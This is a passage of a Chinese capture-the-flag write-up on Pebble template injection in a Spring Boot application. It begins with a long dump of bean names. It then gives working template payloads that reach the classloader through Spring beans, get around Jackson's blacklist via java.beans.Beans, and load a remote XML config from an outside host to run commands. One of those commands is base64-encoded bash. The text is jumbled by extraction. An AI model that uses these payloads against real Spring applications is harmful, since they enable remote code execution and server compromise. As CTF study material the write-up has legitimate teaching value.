org.springframework.boot.context.properties.BoundConfigurationProperties
org.springframework.boot.context.properties.EnableConfigurationPropertiesR
egistrar.methodValidationExcludeFilter
server-org.springframework.boot.autoconfigure.web.ServerProperties
webServerFactoryCustomizerBeanPostProcessor
errorPageRegistrarBeanPostProcessor
org.springframework.boot.autoconfigure.web.servlet.DispatcherServletAutoCo
nfiguration$DispatcherServletConfiguration
dispatcherServlet
spring.mvc-
org.springframework.boot.autoconfigure.web.servlet.WebMvcProperties
org.springframework.boot.autoconfigure.web.servlet.DispatcherServletAutoCo
nfiguration$DispatcherServletRegistrationConfiguration
dispatcherServletRegistration
org.springframework.boot.autoconfigure.web.servlet.DispatcherServletAutoCo
nfiguration
org.springframework.boot.autoconfigure.task.TaskExecutionAutoConfiguration
taskExecutorBuilder
applicationTaskExecutor
spring.task.execution-
org.springframework.boot.autoconfigure.task.TaskExecutionProperties
org.springframework.boot.autoconfigure.web.servlet.error.ErrorMvcAutoConfi
guration$WhitelabelErrorViewConfiguration
error
beanNameViewResolver
org.springframework.boot.autoconfigure.web.servlet.error.ErrorMvcAutoConfi
guration$DefaultErrorViewResolverConfiguration
conventionErrorViewResolver
spring.web-org.springframework.boot.autoconfigure.web.WebProperties
org.springframework.boot.autoconfigure.web.servlet.error.ErrorMvcAutoConfi
guration
errorAttributes
basicErrorController
errorPageCustomizer
preserveErrorControllerTargetClassPostProcessor
org.springframework.boot.autoconfigure.web.servlet.WebMvcAutoConfiguration
$EnableWebMvcConfiguration
requestMappingHandlerAdapter
requestMappingHandlerMapping
welcomePageHandlerMapping
localeResolver
themeResolver
flashMapManager
mvcConversionService
mvcValidator
mvcContentNegotiationManager
mvcPatternParser
mvcUrlPathHelper
mvcPathMatcher
viewControllerHandlerMapping
beanNameHandlerMapping
routerFunctionMapping
resourceHandlerMapping
mvcResourceUrlProvider
defaultServletHandlerMapping
handlerFunctionAdapter
mvcUriComponentsContributor
httpRequestHandlerAdapter
simpleControllerHandlerAdapter
handlerExceptionResolver
mvcViewResolver
mvcHandlerMappingIntrospector
viewNameTranslator
org.springframework.boot.autoconfigure.web.servlet.WebMvcAutoConfiguration
$WebMvcAutoConfigurationAdapter
defaultViewResolver
viewResolver
requestContextFilter
org.springframework.boot.autoconfigure.web.servlet.WebMvcAutoConfiguration
formContentFilter
com.mitchellbosecke.pebble.boot.autoconfigure.PebbleServletWebConfiguratio
n
pebbleViewResolver
com.mitchellbosecke.pebble.boot.autoconfigure.PebbleAutoConfiguration
springExtension
pebbleEngine
pebble-com.mitchellbosecke.pebble.boot.autoconfigure.PebbleProperties
org.springframework.boot.autoconfigure.jmx.JmxAutoConfiguration
mbeanExporter
objectNamingStrategy
mbeanServer
org.springframework.boot.autoconfigure.admin.SpringApplicationAdminJmxAuto
Configuration
springApplicationAdminRegistrar
org.springframework.boot.autoconfigure.aop.AopAutoConfiguration$ClassProxy
ingConfiguration
forceAutoProxyCreatorToUseClassProxying
org.springframework.boot.autoconfigure.aop.AopAutoConfiguration
org.springframework.boot.autoconfigure.availability.ApplicationAvailabilit
yAutoConfiguration
applicationAvailability
org.springframework.boot.autoconfigure.jackson.JacksonAutoConfiguration$Ja
ckson2ObjectMapperBuilderCustomizerConfiguration
standardJacksonObjectMapperBuilderCustomizer
spring.jackson-
org.springframework.boot.autoconfigure.jackson.JacksonProperties
org.springframework.boot.autoconfigure.jackson.JacksonAutoConfiguration$Ja
cksonObjectMapperBuilderConfiguration
jacksonObjectMapperBuilder
org.springframework.boot.autoconfigure.jackson.JacksonAutoConfiguration$Pa
rameterNamesModuleConfiguration
parameterNamesModule
org.springframework.boot.autoconfigure.jackson.JacksonAutoConfiguration$Ja
cksonObjectMapperConfiguration
jacksonObjectMapper
org.springframework.boot.autoconfigure.jackson.JacksonAutoConfiguration
jsonComponentModule
org.springframework.boot.autoconfigure.context.ConfigurationPropertiesAuto
Configuration
org.springframework.boot.autoconfigure.context.LifecycleAutoConfiguration
lifecycleProcessor
spring.lifecycle-
org.springframework.boot.autoconfigure.context.LifecycleProperties
org.springframework.boot.autoconfigure.http.HttpMessageConvertersAutoConfi
guration$StringHttpMessageConverterConfiguration
stringHttpMessageConverter
org.springframework.boot.autoconfigure.http.JacksonHttpMessageConvertersCo
nfiguration$MappingJackson2HttpMessageConverterConfiguration
mappingJackson2HttpMessageConverter
org.springframework.boot.autoconfigure.http.JacksonHttpMessageConvertersCo
nfiguration
org.springframework.boot.autoconfigure.http.HttpMessageConvertersAutoConfi
guration
messageConverters
org.springframework.boot.autoconfigure.info.ProjectInfoAutoConfiguration
spring.info-
org.springframework.boot.autoconfigure.info.ProjectInfoProperties
org.springframework.boot.autoconfigure.sql.init.SqlInitializationAutoConfi
guration
spring.sql.init-
org.springframework.boot.autoconfigure.sql.init.SqlInitializationPropertie
s
org.springframework.boot.sql.init.dependency.DatabaseInitializationDepende
ncyConfigurer$DependsOnDatabaseInitializationPostProcessor
org.springframework.boot.autoconfigure.task.TaskSchedulingAutoConfiguratio
n
scheduledBeanLazyInitializationExcludeFilter
taskSchedulerBuilder
spring.task.scheduling-
org.springframework.boot.autoconfigure.task.TaskSchedulingProperties
之后也算运⽓好，测了前⼏个就发现通过取得internalCachingMetadataReaderFactory对象可以
拿到classLoader
org.springframework.boot.autoconfigure.web.client.RestTemplateAutoConfigur
ation
restTemplateBuilderConfigurer
restTemplateBuilder
org.springframework.boot.autoconfigure.web.embedded.EmbeddedWebServerFacto
ryCustomizerAutoConfiguration$TomcatWebServerFactoryCustomizerConfiguratio
n
tomcatWebServerFactoryCustomizer
org.springframework.boot.autoconfigure.web.embedded.EmbeddedWebServerFacto
ryCustomizerAutoConfiguration
org.springframework.boot.autoconfigure.web.servlet.HttpEncodingAutoConfigu
ration
characterEncodingFilter
localeCharsetMappingsCustomizer
org.springframework.boot.autoconfigure.web.servlet.MultipartAutoConfigurat
ion
multipartConfigElement
multipartResolver
spring.servlet.multipart-
org.springframework.boot.autoconfigure.web.servlet.MultipartProperties
org.springframework.aop.config.internalAutoProxyCreator
因此有了这个我们便可以加载任意类了
但是我们需要获得⼀个类实例，但是我们不能去调⽤它的任何⽅法毕竟是class类，很好的⼀
点是这⾥有jackson
，beans对象⾥也能直接获取到，解决⼀切问题
{% set class1= 
beans.get("org.springframework.boot.autoconfigure.internalCachingMetadataR
eaderFactory").resourceLoader.classLoader.loadClass("xxxx") %}
因此我们能获得⼀个类的实例以后rce就相对“简单”了
，⽐如说
但题⽬当中环境是jdk18，发现engineManager.getEngineByName⾥⾯裤⼦都不剩了啥都没有，
看来这个⽅法也是没⽤的，同时由于jackson实例化限制我们也不能直接实例化jshell
此时灵机⼀动我又想到两个类，它们实例化加载配置⽂件可以造成rce
org.springframework.context.support.ClassPathXmlApplicationContext
org.springframework.context.support.FileSystemXmlApplicationContext
但是脸⿊啊，环境⾥⾯jackson有限制，继承了
AbstractPointcutAdvisor/AbstractApplicationContext这两个类的都不⾏，⼼⾥xxx
这时候怎么办呢？那classpath下有没有某个类可以帮助我们实例化任意对象呢？
{% set woshishuaibi =  beans.get("jacksonObjectMapper").readValue("{}", 
class1) %}
ScriptEngineManager engineManager = new ScriptEngineManager();
ScriptEngine engine = engineManager.getEngineByName("js");
engine.eval("xxxx");
另类绕过Jackson⿊名单限制
当然有哒！也就是java.beans.Beans类，这个类可以帮助我们实例化任意⽅法
这⾥的参数cls可以不传，为null则会默认调⽤ClassLoader.getSystemClassLoader();获取⼀个
classloader
public static Object instantiate(ClassLoader cls, String beanName) throws 
IOException, ClassNotFoundException {
  return Beans.instantiate(cls, beanName, null, null);
}
public static Object instantiate(ClassLoader cls, String beanName,
                                 BeanContext beanContext,
                                 AppletInitializer initializer)
  throws IOException, ClassNotFoundException {
  InputStream ins;
  ObjectInputStream oins = null;
  Object result = null;
  boolean serialized = false;
  IOException serex = null;
  // If the given classloader is null, we check if an
  // system classloader is available and (if so)
  // use that instead.
  // Note that calls on the system class loader will
  // look in the bootstrap class loader first.
  if (cls == null) {
    try {
      cls = ClassLoader.getSystemClassLoader();
    } catch (SecurityException ex) {
      // We're not allowed to access the system class loader.
      // Drop through.
    }
  }
之后的逻辑我们不需要关注那个⼆次反序列化的部分,在后⾯可以看到可以实例化任意public修
饰的构造⽅法
最终构造实现RCE
if (result == null) {
  // No serialized object, try just instantiating the class
  Class cl;
  try {
    cl = ClassFinder.findClass(beanName, cls);
  } catch (ClassNotFoundException ex) {
    // There is no appropriate class.  If we earlier tried to
    // deserialize an object and got an IO exception, throw that,
    // otherwise rethrow the ClassNotFoundException.
    if (serex != null) {
      throw serex;
    }
    throw ex;
  }
  if (!Modifier.isPublic(cl.getModifiers())) {
    throw new ClassNotFoundException("" + cl + " : no public access");
  }
  /*
             * Try to instantiate the class.
             */
  try {
    result = cl.newInstance();
  } catch (Exception ex) {
    // We have to remap the exception to one in our signature.
    // But we pass extra information in the detail message.
    throw new ClassNotFoundException("" + cl + " : " + ex, ex);
  }
}
最终模板⽂件构造
1.xml
本地弹出了计算器，那么现在则可以开始着⼿解题了，
构造命令 ./getflag > /tmp/flag
{% set y= 
beans.get("org.springframework.boot.autoconfigure.internalCachingMetadataR
eaderFactory").resourceLoader.classLoader.loadClass("java.beans.Beans") %}
{% set yy =  beans.get("jacksonObjectMapper").readValue("{}", y) %}
{% set yyy = 
yy.instantiate(null,"org.springframework.context.support.ClassPathXmlAppli
cationContext") %}
{{ yyy.setConfigLocation("http://xxxx/1.xml") }}
{{ yyy.refresh() }}
                open
                -a
                calculator
先⽤burp狂轰乱炸，看到页⾯有回显的说明执⾏成功
                bash
                -c
                echo Li9nZXRmbGFnID4gL3RtcC9mbGFn|base64 -d|bash -
i
再包含进来就ok了
参考⽂章
远古pebble模板注⼊payload
Determine if a Process Runs Inside a Container